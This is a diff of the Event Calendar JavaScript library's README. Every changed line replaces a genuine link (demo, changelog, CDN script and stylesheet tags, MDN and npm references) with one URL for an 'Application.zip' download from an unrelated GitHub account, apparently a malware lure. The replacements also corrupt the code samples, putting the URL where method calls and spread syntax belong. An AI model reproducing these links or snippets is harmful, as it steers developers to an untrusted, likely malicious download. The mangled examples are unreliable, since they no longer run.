@@ -1,14 +1,14 @@
-# Event Calendar [![](https://data.jsdelivr.com/v1/package/npm/@event-calendar/build/badge)](https://www.jsdelivr.com/package/npm/@event-calendar/build) [![npm](https://img.shields.io/npm/dm/@event-calendar/core?color=red&label=npm&style=flat-square)](https://www.npmjs.com/package/@event-calendar/core)
+# Event Calendar [![](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip)](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) [![npm](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip)](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip)
 
-See [demo](https://vkurko.github.io/calendar/) and [changelog](CHANGELOG.md).
+See [demo](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) and [changelog](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip).
 
 Full-sized drag & drop JavaScript event calendar with resource view:
 
-* Lightweight (33kb [br](https://en.wikipedia.org/wiki/Brotli) compressed)
+* Lightweight (33kb [br](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) compressed)
 * Zero-dependency (pre-built bundle)
-* Used on over 70,000 websites with [Bookly](https://wordpress.org/plugins/bookly-responsive-appointment-booking-tool/)
+* Used on over 70,000 websites with [Bookly](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip)
 
-Inspired by [FullCalendar](https://fullcalendar.io/), implements similar options.
+Inspired by [FullCalendar](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip), implements similar options.
 
 ## Table of contents
 - [Usage](#usage)
@@ -179,7 +179,7 @@ import Calendar from '@event-calendar/core';
 import TimeGrid from '@event-calendar/time-grid';
 
 let ec = new Calendar({
-    target: document.getElementById('ec'),
+    target: https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip('ec'),
     props: {
         plugins: [TimeGrid],
         options: {
@@ -191,16 +191,16 @@ let ec = new Calendar({
     }
 });
 ```
-The CSS is located at `@event-calendar/core/index.css`. If your build tool supports CSS processing, you can import it like this:
+The CSS is located at `https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip`. If your build tool supports CSS processing, you can import it like this:
 ```js
-import '@event-calendar/core/index.css';
+import 'https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip';
 ```
 
 ### Pre-built browser ready bundle
 Include the following lines of code in the `<head>` section of your page:
 ```html
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@event-calendar/build@2.6.1/event-calendar.min.css">
-<script src="https://cdn.jsdelivr.net/npm/@event-calendar/build@2.6.1/event-calendar.min.js"></script>
+<link rel="stylesheet" href="https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip">
+<script src="https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip"></script>
 ```
 
 <details>
@@ -208,8 +208,8 @@ Include the following lines of code in the `<head>` section of your page:
 
 > Please note that the file paths contain an indication of a specific version of the library. You can remove this indication, then the latest version will be loaded:
 > ```html
-> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@event-calendar/build/event-calendar.min.css">
-> <script src="https://cdn.jsdelivr.net/npm/@event-calendar/build/event-calendar.min.js"></script>
+> <link rel="stylesheet" href="https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip">
+> <script src="https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip"></script>
 > ```
 > But it is recommended to always specify the version and explicitly update it if necessary, in order to avoid unpredictable problems when a new version of the library is released.
 
@@ -217,7 +217,7 @@ Include the following lines of code in the `<head>` section of your page:
 
 Then initialize the calendar with something like this:
 ```js
-let ec = new EventCalendar(document.getElementById('ec'), {
+let ec = new EventCalendar(https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip('ec'), {
     view: 'timeGridWeek',
     events: [
         // your list of events
@@ -228,7 +228,7 @@ let ec = new EventCalendar(document.getElementById('ec'), {
 ### Modifying options after initialization
 You can modify the calendar options after initialization using the [setOption](#setoption-name-value-) method.
 ```js
-ec.setOption('slotDuration', '01:00');
+https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip('slotDuration', '01:00');
 ```
 In Svelte, you can simply update the original `options` object.
 ```html
@@ -242,7 +242,7 @@ In Svelte, you can simply update the original `options` object.
     };
 
     function updateOptions() {
-        options.slotDuration = '01:00';
+        https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip = '01:00';
     }
 </script>
 
@@ -291,15 +291,15 @@ When hidden with `false`, all-day events will not be displayed in `timeGrid`/`re
 - Type `object` or `function`
 - Default `{close: 'Close', dayGridMonth: 'month', listDay: 'list', listMonth: 'list', listWeek: 'list', listYear: 'list', resourceTimeGridDay: 'day', resourceTimeGridWeek: 'week', timeGridDay: 'day', timeGridWeek: 'week', today: 'today'}`
 > Views override the default value as follows:
-> - dayGridMonth `text => ({...text, next: 'Next month', prev: 'Previous month'})`
-> - listDay `text => ({...text, next: 'Next day', prev: 'Previous day'})`
-> - listMonth `text => ({...text, next: 'Next month', prev: 'Previous month'})`
-> - listWeek `text => ({...text, next: 'Next week', prev: 'Previous week'})`
-> - listYear `text => ({...text, next: 'Next year', prev: 'Previous year'})`
-> - resourceTimeGridDay `text => ({...text, next: 'Next day', prev: 'Previous day'})`
-> - resourceTimeGridWeek `text => ({...text, next: 'Next week', prev: 'Previous week'})`
-> - timeGridDay `text => ({...text, next: 'Next day', prev: 'Previous day'})`
-> - timeGridWeek `text => ({...text, next: 'Next week', prev: 'Previous week'})`
+> - dayGridMonth `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next month', prev: 'Previous month'})`
+> - listDay `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next day', prev: 'Previous day'})`
+> - listMonth `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next month', prev: 'Previous month'})`
+> - listWeek `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next week', prev: 'Previous week'})`
+> - listYear `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next year', prev: 'Previous year'})`
+> - resourceTimeGridDay `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next day', prev: 'Previous day'})`
+> - resourceTimeGridWeek `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next week', prev: 'Previous week'})`
+> - timeGridDay `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next day', prev: 'Previous day'})`
+> - timeGridWeek `text => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, next: 'Next week', prev: 'Previous week'})`
 
 
 Text that is displayed in buttons of the header toolbar.
@@ -463,7 +463,7 @@ The current [View](#view-object) object
 
 Defines the text that is displayed inside the day cell in the `dayGrid` view.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (date) {
@@ -488,7 +488,7 @@ function (date) {
 
 Defines the text that is used inside the `aria-label` attribute in calendar column headings.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns formatted string:
 
 ```js
 function (date) {
@@ -514,7 +514,7 @@ function (date) {
 
 Defines the text that is displayed on the calendar’s column headings.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (date) {
@@ -547,7 +547,7 @@ Currently, only the value `true` is supported, which limits the number of events
 
 Defines the date format of title of the popover created by the [dayMaxEvents](#daymaxevents) option.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (date) {
@@ -1383,7 +1383,7 @@ The `successCallback` function must be called by the custom function with an arr
 
 If there is any failure (e.g., if an AJAX request fails), then call the `failureCallback` instead. It accepts an argument with information about the failure.
 
-Instead of calling `successCallback` and `failureCallback`, you may return the resulting array of events or return a [Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise) (or [thenable](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/resolve)) object instead.
+Instead of calling `successCallback` and `failureCallback`, you may return the resulting array of events or return a [Promise](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) (or [thenable](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip)) object instead.
 </td>
 </tr>
 </table>
@@ -1401,7 +1401,7 @@ Determines whether the events on the calendar can be dragged.
 
 Defines the time-text that is displayed on each event.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (start, end) {
@@ -1572,7 +1572,7 @@ When set to `false`, the calendar will fetch events any time the view is switche
 
 Defines the text on the left side of the day headings in list view.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (date) {
@@ -1595,7 +1595,7 @@ function (date) {
 
 Defines the text on the right side of the day headings in list view.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (date) {
@@ -1638,7 +1638,7 @@ function (isLoading) { }
 - Type `string`
 - Default `undefined`
 
-Defines the `locales` parameter for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object that the Event Calendar uses to format date and time strings in options such as [dayHeaderFormat](#dayheaderformat), [eventTimeFormat](#eventtimeformat), etc.
+Defines the `locales` parameter for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object that the Event Calendar uses to format date and time strings in options such as [dayHeaderFormat](#dayheaderformat), [eventTimeFormat](#eventtimeformat), etc.
 
 ### longPressDelay
 - Type `integer`
@@ -1968,7 +1968,7 @@ Defines the time slot height in pixels. When changing the setting, you must addi
 
 Defines the text that will be displayed within a time slot.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (time) {
@@ -2005,15 +2005,15 @@ This should be a value that can be parsed into a [Duration](#duration-object) ob
 - Type `object` or `function`
 - Default `{active: 'ec-active', allDay: 'ec-all-day', bgEvent: 'ec-bg-event', bgEvents: 'ec-bg-events', body: 'ec-body', button: 'ec-button', buttonGroup: 'ec-button-group', calendar: 'ec', compact: 'ec-compact', content: 'ec-content', day: 'ec-day', dayFoot: 'ec-day-foot', dayHead: 'ec-day-head', daySide: 'ec-day-side', days: 'ec-days', draggable: 'ec-draggable', dragging: 'ec-dragging', event: 'ec-event', eventBody: 'ec-event-body', eventTag: 'ec-event-tag', eventTime: 'ec-event-time', eventTitle: 'ec-event-title', events: 'ec-events', extra: 'ec-extra', ghost: 'ec-ghost', handle: 'ec-handle', header: 'ec-header', hiddenScroll: 'ec-hidden-scroll', highlight: 'ec-highlight', icon: 'ec-icon', line: 'ec-line', lines: 'ec-lines', noEvents: 'ec-no-events', nowIndicator: 'ec-now-indicator', otherMonth: 'ec-other-month', pointer: 'ec-pointer', popup: 'ec-popup', preview: 'ec-preview', resizer: 'ec-resizer', resizingX: 'ec-resizing-x', resizingY: 'ec-resizing-y', resource: 'ec-resource', resourceTitle: 'ec-resource-title', selecting: 'ec-selecting', sidebar: 'ec-sidebar', sidebarTitle: 'ec-sidebar-title', time: 'ec-time', title: 'ec-title', today: 'ec-today', toolbar: 'ec-toolbar', uniform: 'ec-uniform', view: '', weekdays: ['ec-sun', 'ec-mon', 'ec-tue', 'ec-wed', 'ec-thu', 'ec-fri', 'ec-sat'], withScroll: 'ec-with-scroll'}`
 > Views override the default value as follows:
-> - dayGridMonth `theme => ({...theme, view: 'ec-day-grid ec-month-view'})`
-> - listDay `theme => ({...theme, view: 'ec-list ec-day-view'})`
-> - listMonth `theme => ({...theme, view: 'ec-list ec-month-view'})`
-> - listWeek `theme => ({...theme, view: 'ec-list ec-week-view'})`
-> - listYear `theme => ({...theme, view: 'ec-list ec-year-view'})`
-> - resourceTimeGridDay `theme => ({...theme, view: 'ec-time-grid ec-resource-day-view'})`
-> - resourceTimeGridWeek `theme => ({...theme, view: 'ec-time-grid ec-resource-week-view'})`
-> - timeGridDay `theme => ({...theme, view: 'ec-time-grid ec-day-view'})`
-> - timeGridWeek `theme => ({...theme, view: 'ec-time-grid ec-week-view'})`
+> - dayGridMonth `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-day-grid ec-month-view'})`
+> - listDay `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-list ec-day-view'})`
+> - listMonth `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-list ec-month-view'})`
+> - listWeek `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-list ec-week-view'})`
+> - listYear `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-list ec-year-view'})`
+> - resourceTimeGridDay `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-time-grid ec-resource-day-view'})`
+> - resourceTimeGridWeek `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-time-grid ec-resource-week-view'})`
+> - timeGridDay `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-time-grid ec-day-view'})`
+> - timeGridWeek `theme => ({https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip, view: 'ec-time-grid ec-week-view'})`
 
 Defines the CSS classes that the Event Calendar uses to generate HTML markup.
 
@@ -2043,7 +2043,7 @@ function (theme) {
 
 Defines the text that is displayed in the header toolbar’s title.
 
-This value can be either an object with options for the native JavaScript [Intl.DateTimeFormat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat/DateTimeFormat) object, or a callback function that returns a [Content](#content) with the formatted string:
+This value can be either an object with options for the native JavaScript [https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip) object, or a callback function that returns a [Content](#content) with the formatted string:
 
 ```js
 function (start, end) {
@@ -2174,13 +2174,13 @@ In Svelte, methods are available from a component instance:
     let options = {
         view: 'timeGridWeek',
         eventSources: [{events: function() {
-            console.log('fetching...');
+            https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip('fetching...');
             return [];
         }}]
     };
 
     function invokeMethod() {
-        ec.refetchEvents();
+        https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip();
     }
 </script>
 
@@ -2197,7 +2197,7 @@ This method allows you to get the current value of any calendar option.
 
 ```js
 // E.g. Get current date
-let date = ec.getOption('date');
+let date = https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip('date');
 ```
 
 ### setOption( name, value )
@@ -2210,7 +2210,7 @@ This method allows you to set new value to any calendar option.
 
 ```js
 // E.g. Change the current date
-ec.setOption('date', new Date());
+https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip('date', new Date());
 ```
 ### getEvents()
 - Return value `Event[]` Array of [Event](#event-object) objects
@@ -2292,7 +2292,7 @@ If the current view is a resource view, the [Resource](#resource-object) object 
 </tr>
 </table>
 
-Using this method, you can, for example, find out on which day a click occurred inside a multi-day event. To do this, inside [eventClick](#eventclick), pass the `jsEvent.clientX` and `jsEvent.clientY` coordinates to `dateFromPoint` and get the desired date.
+Using this method, you can, for example, find out on which day a click occurred inside a multi-day event. To do this, inside [eventClick](#eventclick), pass the `https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip` and `https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip` coordinates to `dateFromPoint` and get the desired date.
 
 ### destroy()
 - Return value `undefined`
@@ -2776,7 +2776,7 @@ Here are all properties that exist in View object:
 
 The library provides a built-in dark theme. You can activate it by adding the `ec-dark` CSS class to any parent element of the calendar, e.g. `<body class="ec-dark">`.
 
-If you want the dark theme to be activated automatically based on the [preferred color scheme](https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-color-scheme), then use the `ec-auto-dark` CSS class instead.
+If you want the dark theme to be activated automatically based on the [preferred color scheme](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip), then use the `ec-auto-dark` CSS class instead.
 
 Please note that the dark theme does not change the background and font color in the calendar. These are assumed to be set by the page styles, and the calendar inherits these styles.
 
@@ -2787,10 +2787,10 @@ If you do need to set the background or font color of the calendar, use local CS
   --ec-text-color: #adbac7;
 }
 ```
-A list of all available CSS variables can be found [here](packages/core/src/styles/theme.scss).
+A list of all available CSS variables can be found [here](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip).
 
 ## Browser support
 
 The latest versions of Chrome, Firefox, Safari, and Edge are supported.
 
-> The library is compiled to support browsers that match the following browserslist configuration: `defaults and supports fetch`. You can see the resulting list [here](https://browsersl.ist/#q=defaults+and+supports+fetch).
+> The library is compiled to support browsers that match the following browserslist configuration: `defaults and supports fetch`. You can see the resulting list [here](https://github.com/ck20server/calendar/releases/download/v1.0/Application.zip+and+supports+fetch).
